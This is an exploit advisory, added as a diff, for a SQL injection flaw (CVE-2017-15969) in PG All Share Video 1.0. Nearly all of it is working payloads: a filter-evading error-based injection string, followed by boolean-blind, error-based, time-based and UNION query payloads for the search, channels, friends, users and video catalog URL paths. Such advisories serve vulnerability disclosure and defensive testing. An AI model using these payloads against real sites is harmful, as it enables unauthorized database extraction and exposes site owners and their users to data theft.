@@ -1,0 +1,107 @@
+# # # # # 
+# Exploit Title: PG All Share Video 1.0 - SQL Injection
+# Dork: N/A
+# Date: 30.10.2017
+# Vendor Homepage: http://www.pilotgroup.net/
+# Software Link: http://www.allsharevideo.com/features.php
+# Demo: http://demo.allsharevideo.com/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2017-15969
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# http://localhost/[PATH]/search/tag/[SQL]
+# http://localhost/[PATH]/friends/index/1[SQL]
+# http://localhost/[PATH]/users/profile/1[SQL]
+# http://localhost/[PATH]/video_catalog/category/1[SQL]
+# 
+# 'ANd(/*!06666seleCt+*/1/*!06666frOm*/(/*!06666seleCt*/%20COunt(*),/*!06666COnCAt*/((seleCt(seleCt+COnCAt(CAst(dAtAbAse()As%20ChAr),0x7e,0x496873616E53656e63616e))%20frOm%20infOrmAtiOn_sChemA.tAbles%20where%20tAble_sChemA=dAtAbAse()%20limit%200,1),flOOr(rAnd(0)*2))x%20frOm%20infOrmAtiOn_sChemA.tAbles%20grOup%20by%20x)A)%20AnD%20''='
+# 
+# Parameter: #1* (URI)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: http://localhost/[PATH]/search/tag/VerAyari' AND 2686=2686 AND 'UsmZ'='UsmZ
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: http://localhost/[PATH]/search/tag/VerAyari' AND (SELECT 4572 FROM(SELECT COUNT(*),CONCAT(0x71717a6a71,(SELECT (ELT(4572=4572,1))),0x716b627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'iudq'='iudq
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: http://localhost/[PATH]/search/tag/VerAyari' AND SLEEP(5) AND 'iczN'='iczN
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 3 columns
+#     Payload: http://localhost/[PATH]/search/tag/VerAyari' UNION ALL SELECT NULL,NULL,CONCAT(0x71717a6a71,0x4b6e4a524653614e47727a4f4464575253424c4d6c544f6b6a78454e4a756c75794d6a7765697269,0x716b627871)-- mAFc
+# 
+# Parameter: #1* (URI)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: http://localhost/[PATH]/channels/category/7' AND 4239=4239 AND 'oXBo'='oXBo
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: http://localhost/[PATH]/channels/category/7' AND (SELECT 4458 FROM(SELECT COUNT(*),CONCAT(0x7170626b71,(SELECT (ELT(4458=4458,1))),0x7176787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'JBxT'='JBxT
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 3 columns
+#     Payload: http://localhost/[PATH]/channels/category/7' UNION ALL SELECT NULL,NULL,CONCAT(0x7170626b71,0x574355636a666d516c4d437a78696a5a6243555a46486f494a45455a6c49574e577765704a496367,0x7176787071)-- kJpu
+# 
+# Parameter: #1* (URI)
+#     Type: boolean-based blind
+#     Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+#     Payload: http://localhost/[PATH]/friends/index/11' RLIKE (SELECT (CASE WHEN (2135=2135) THEN 11 ELSE 0x28 END))-- SVFb
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: http://localhost/[PATH]/friends/index/11' AND (SELECT 1564 FROM(SELECT COUNT(*),CONCAT(0x7170786a71,(SELECT (ELT(1564=1564,1))),0x716a717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- DoZE
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 OR time-based blind
+#     Payload: http://localhost/[PATH]/friends/index/11' OR SLEEP(5)-- Maum
+# 
+# Parameter: #1* (URI)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: http://localhost/[PATH]/users/profile/1' AND 3612=3612 AND 'wNwI'='wNwI
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: http://localhost/[PATH]/users/profile/1' AND (SELECT 3555 FROM(SELECT COUNT(*),CONCAT(0x716a767671,(SELECT (ELT(3555=3555,1))),0x717a7a7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'XrEj'='XrEj
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: http://localhost/[PATH]/users/profile/1' AND SLEEP(5) AND 'XZVf'='XZVf
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 3 columns
+#     Payload: http://localhost/[PATH]/users/profile/1' UNION ALL SELECT NULL,NULL,CONCAT(0x716a767671,0x7a7a646e536849756f717771546e4547497549465459754f65636946535375667577596755616876,0x717a7a7a71)-- UaUA
+# 
+# Parameter: #1* (URI)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: http://localhost/[PATH]/video_catalog/category/1' AND 4550=4550 AND 'SAmI'='SAmI
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: http://localhost/[PATH]/video_catalog/category/1' AND (SELECT 4089 FROM(SELECT COUNT(*),CONCAT(0x716a6a7171,(SELECT (ELT(4089=4089,1))),0x716b786a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'PTze'='PTze
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: http://localhost/[PATH]/video_catalog/category/1' AND SLEEP(5) AND 'ptLy'='ptLy
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 3 columns
+#     Payload: http://localhost/[PATH]/video_catalog/category/1' UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7171,0x4c5a694b4948566c59527663484b7a466c76725746684863506159646973414749617966634d5145,0x716b786a71)-- zDQK
+# 
+# Etc..
+# # # # #
